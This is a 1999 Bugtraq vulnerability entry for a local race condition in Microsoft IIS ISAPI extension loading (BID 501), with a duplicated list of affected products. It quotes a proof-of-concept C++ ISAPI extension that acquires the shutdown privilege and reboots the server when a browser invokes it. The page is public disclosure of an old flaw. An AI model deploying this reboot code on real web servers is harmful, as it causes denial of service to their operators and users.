#SpeeDr00t@Black Falcon<br>#bid501<p><b><span style="font-size: 18pt;">NT IIS ISAPI GetExtensionVersion() Vulnerability</span></b></p><br><br><a href="http://www.securityfocus.com/bid/501/info">info</a><br><a href="http://www.securityfocus.com/bid/501/discuss">discussion</a><br><a href="http://www.securityfocus.com/bid/501/exploit">exploit</a><br><a href="http://www.securityfocus.com/bid/501/solution">solution</a><br><a href="http://www.securityfocus.com/bid/501/references">references</a><br><br><br><br><br>#<br>#<div id="vulnerability">
<span class="title"></span><br/><br/>
<table border="0" cellpadding="4" cellspacing="0">
<tr>
<td>
<span class="label">Bugtraq ID:</span>
</td>
<td>
				501
			</td>
</tr>
<tr>
<td>
<span class="label">Class:</span>
</td>
<td>
				Race Condition Error
			</td>
</tr>
<tr valign="top">
<td>
<span class="label">CVE:</span>
</td>
<td>
</td>
</tr>
<tr>
<td>
<span class="label">Remote:</span>
</td>
<td>
				No
			</td>
</tr>
<tr>
<td>
<span class="label">Local:</span>
</td>
<td>
				Yes
			</td>
</tr>
<tr>
<td>
<span class="label">Published:</span>
</td>
<td>
				Mar 08 1999 12:00AM
			</td>
</tr>
<tr>
<td>
<span class="label">Updated:</span>
</td>
<td>
				Mar 08 1999 12:00AM
			</td>
</tr>
<tr>
<td>
<span class="label">Credit:</span>
</td>
<td>
				First posted to NTbugtraq on March 8, 1999 by Fabien Royer &lt;fabienr@BELLATLANTIC.NET&gt;.
			</td>
</tr>
<tr valign="top">
<td>
<span class="label">Vulnerable:</span>
</td>
<td>
				
					Microsoft IIS  4.0<br/>
<span class="related">
						
							+ 
						
						Cisco Building Broadband Service Manager (BBSM) 5.0 <br/>
</span>
<span class="related">
						
							+ 
						
						Cisco Building Broadband Service Manager (BBSM) 5.0 <br/>
</span>
<span class="related">
						
							+ 
						
						Cisco Call Manager 3.0 <br/>
</span>
<span class="related">
						
							+ 
						
						Cisco Call Manager 3.0 <br/>
</span>
<span class="related">
						
							+ 
						
						Cisco Call Manager 2.0 <br/>
</span>
<span class="related">
						
							+ 
						
						Cisco Call Manager 2.0 <br/>
</span>
<span class="related">
						
							+ 
						
						Cisco Call Manager 1.0 <br/>
</span>
<span class="related">
						
							+ 
						
						Cisco Call Manager 1.0 <br/>
</span>
<span class="related">
						
							+ 
						
						Cisco ICS 7750  <br/>
</span>
<span class="related">
						
							+ 
						
						Cisco ICS 7750  <br/>
</span>
<span class="related">
						
							+ 
						
						Cisco IP/VC 3540 Video Rate Matching Module  <br/>
</span>
<span class="related">
						
							+ 
						
						Cisco IP/VC 3540 Video Rate Matching Module  <br/>
</span>
<span class="related">
						
							+ 
						
						Cisco Unity Server 2.4 <br/>
</span>
<span class="related">
						
							+ 
						
						Cisco Unity Server 2.4 <br/>
</span>
<span class="related">
						
							+ 
						
						Cisco Unity Server 2.3 <br/>
</span>
<span class="related">
						
							+ 
						
						Cisco Unity Server 2.3 <br/>
</span>
<span class="related">
						
							+ 
						
						Cisco Unity Server 2.2 <br/>
</span>
<span class="related">
						
							+ 
						
						Cisco Unity Server 2.2 <br/>
</span>
<span class="related">
						
							+ 
						
						Cisco Unity Server 2.0 <br/>
</span>
<span class="related">
						
							+ 
						
						Cisco Unity Server 2.0 <br/>
</span>
<span class="related">
						
							+ 
						
						Cisco uOne 4.0 <br/>
</span>
<span class="related">
						
							+ 
						
						Cisco uOne 4.0 <br/>
</span>
<span class="related">
						
							+ 
						
						Cisco uOne 3.0 <br/>
</span>
<span class="related">
						
							+ 
						
						Cisco uOne 3.0 <br/>
</span>
<span class="related">
						
							+ 
						
						Cisco uOne 2.0 <br/>
</span>
<span class="related">
						
							+ 
						
						Cisco uOne 2.0 <br/>
</span>
<span class="related">
						
							+ 
						
						Cisco uOne 1.0 <br/>
</span>
<span class="related">
						
							+ 
						
						Cisco uOne 1.0 <br/>
</span>
<span class="related">
						
							+ 
						
						Hancom Hancom Office 2007  0<br/>
</span>
<span class="related">
						
							+ 
						
						Hancom Hancom Office 2007  0<br/>
</span>
<span class="related">
						
							+ 
						
						Microsoft BackOffice  4.5<br/>
</span>
<span class="related">
						
							+ 
						
						Microsoft BackOffice  4.5<br/>
</span>
<span class="related">
						
							+ 
						
						Microsoft Windows NT 4.0 Option Pack  <br/>
</span>
<span class="related">
						
							+ 
						
						Microsoft Windows NT 4.0 Option Pack  <br/>
</span>
					
				
					Microsoft IIS  3.0<br/>
<span class="related">
						
							-
						
						Microsoft Windows NT  4.0 SP6a<br/>
</span>
<span class="related">
						
							-
						
						Microsoft Windows NT  4.0 SP6a<br/>
</span>
<span class="related">
						
							-
						
						Microsoft Windows NT  4.0 SP6<br/>
</span>
<span class="related">
						
							-
						
						Microsoft Windows NT  4.0 SP6<br/>
</span>
<span class="related">
						
							-
						
						Microsoft Windows NT  4.0 SP5<br/>
</span>
<span class="related">
						
							-
						
						Microsoft Windows NT  4.0 SP5<br/>
</span>
<span class="related">
						
							-
						
						Microsoft Windows NT  4.0 SP4<br/>
</span>
<span class="related">
						
							-
						
						Microsoft Windows NT  4.0 SP4<br/>
</span>
<span class="related">
						
							-
						
						Microsoft Windows NT  4.0 SP3<br/>
</span>
<span class="related">
						
							-
						
						Microsoft Windows NT  4.0 SP3<br/>
</span>
<span class="related">
						
							-
						
						Microsoft Windows NT  4.0 SP2<br/>
</span>
<span class="related">
						
							-
						
						Microsoft Windows NT  4.0 SP2<br/>
</span>
<span class="related">
						
							-
						
						Microsoft Windows NT  4.0 SP1<br/>
</span>
<span class="related">
						
							-
						
						Microsoft Windows NT  4.0 SP1<br/>
</span>
<span class="related">
						
							-
						
						Microsoft Windows NT  4.0<br/>
</span>
<span class="related">
						
							-
						
						Microsoft Windows NT  4.0<br/>
</span>
					
				
					Microsoft IIS  2.0<br/>
<span class="related">
						
							+ 
						
						Microsoft Windows NT  4.0<br/>
</span>
<span class="related">
						
							+ 
						
						Microsoft Windows NT  4.0<br/>
</span>
</td>
</tr>
<tr>
<td colspan="2">
<div class="breakline"></div>
</td>
</tr>
<tr valign="top">
<td>
<span class="label">Not Vulnerable:</span>
</td>
<td>
</td>
</tr>
</table>
</div><br><br>#<br>##no_exploit_link<br><br><br><br>#<br>#<div id="vulnerability">
<span class="title"></span><br/><br/>
	Copied verbatim from a post to NTbugtraq by Fabien Royer &lt;fabienr@BELLATLANTIC.NET&gt;.<br/><br/>Using VC++, create an ISAPI extension project and call it CRbExtension. Replace GetExtensionVersion() and Default() with the code below. Compile it to something<br/> simple, like rb.dll. Place it on your web server and invoke it from your browser like this http://your.machine.namerb.dll? Note: if you are using IE4.0, don't call this from<br/> the machine that is running the web server otherwise, the next time you log in, IE will recall the last URL and you'll reboot again. <br/><br/> BOOL CRbExtension::GetExtensionVersion(HSE_VERSION_INFO* pVer) <br/> { HANDLE hToken; // handle to process token TOKEN_PRIVILEGES tkp; // pointer to token structure <br/><br/> // Get the current process token handle so we can get shutdown // privilege. OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES |<br/> TOKEN_QUERY, &amp;hToken); <br/><br/> // Get the LUID for shutdown privilege. LookupPrivilegeValue(NULL, SE_SHUTDOWN_NAME, &amp;tkp.Privileges0.Luid); <br/><br/> tkp.PrivilegeCount = 1; // one privilege to set tkp.Privileges0.Attributes = SE_PRIVILEGE_ENABLED; <br/><br/> // Get shutdown privilege for this process. AdjustTokenPrivileges(hToken, FALSE, &amp;tkp, 0, (PTOKEN_PRIVILEGES) NULL, 0); <br/><br/> ExitWindowsEx(EWX_REBOOT,0); <br/><br/> // Disable shutdown privilege. tkp.Privileges0.Attributes = 0; AdjustTokenPrivileges(hToken, FALSE, &amp;tkp, 0, (PTOKEN_PRIVILEGES) NULL, 0); <br/><br/> // Call default implementation for initialization CHttpServer::GetExtensionVersion(pVer); <br/><br/> // Load description string TCHAR szHSE_MAX_EXT_DLL_NAME_LEN+1; ISAPIVERIFY(::LoadString(AfxGetResourceHandle(),IDS_SERVER, sz,<br/> HSE_MAX_EXT_DLL_NAME_LEN)); _tcscpy(pVer-&gt;lpszExtensionDesc, sz); return TRUE; <br/> } <br/><br/> void CRbExtension::Default(CHttpServerContext* pCtxt) <br/> { StartContent(pCtxt); WriteTitle(pCtxt); <br/><br/> *pCtxt &lt;&lt; _T("Reboot&lt;br&gt;"); <br/><br/> EndContent(pCtxt); <br/> } 
	
		<ul>
</ul>
</div>